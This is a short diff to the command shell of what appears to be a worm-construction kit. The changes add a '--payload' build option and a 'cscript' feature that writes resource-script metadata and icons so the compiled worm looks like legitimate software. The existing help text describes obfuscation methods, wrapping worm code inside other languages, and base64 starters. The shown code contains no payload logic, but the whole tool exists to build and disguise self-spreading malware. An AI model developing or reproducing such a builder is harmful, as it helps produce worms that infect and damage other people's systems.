@@ -67,7 +67,7 @@ class QueenShell:
             self.sorter("shadow", "Code Obfuscation Methods")
             self.sorter("wrapper", "It wraps, puts the worm code into other code. E.g., it puts python code into assembler.")
             self.sorter("process", "The worm's code pipeline. All the steps that will be taken to create the worm. Changing the default can lead to compilation errors.")
-
+            self.sorter("cscript", "Compiler Script. see 'show --help' for more information")
         
         @hiveShell.command()
         def clr() -> None:
@@ -154,6 +154,8 @@ class QueenShell:
                 cprint(hw, self.color_help)
                 hw = self.texter.make_2column("-- starter --", "This is the final method of modifying the worm's code. You can, for example, convert it to single-line base64 code, you can put the code in a special trigger that will add an additional action. There are also starters that add junk scripts and variables to increase the size of the code or naturally slow down the execution of the main code.")
                 cprint(hw, self.color_help)
+                hw = self.texter.make_2column("-- cscript --", "(Compile Script) Generates .rc resource script files containing metadata that makes the final executable look more professional. It also allows adding icons and other visual elements. Some modules automatically create and use these scripts, but you can always add or replace them manually.")
+                cprint(hw, self.color_help)
                 
             
             if types:
@@ -185,7 +187,8 @@ class QueenShell:
         @hiveShell.command()
         @click.option("--no_compile", "-nc", required=False, is_flag=True, help="It does not perform compilation. It only creates a code file.")
         @click.option("--compiler", "-c", required=False, help="Name of the compiler used for compilation")
-        def build(no_compile, compiler):
+        @click.option("--payload", "-p", is_flag=True, required=False, help="Build your worm as payload. Put ready module to library")
+        def build(no_compile, compiler, payload):
             """\nConstruction and compilation of the worm. If your worm is ready you can compile it. The compilation process takes different amounts of time and depends on the worm code and the compiler you use.
 Remember not to use compilers that are not designed for worm language. Nothing good will come out of it."""
             opt = {}
@@ -193,6 +196,8 @@ Remember not to use compilers that are not designed for worm language. Nothing g
                 opt["NO_COMPILE"] = True
             if compiler:
                 opt["COMPILER_NAME"] = compiler
+            if payload:
+                opt["PAYLOAD"] = True
             self.Queen.build_worm(opt)
         
         @hiveShell.command()
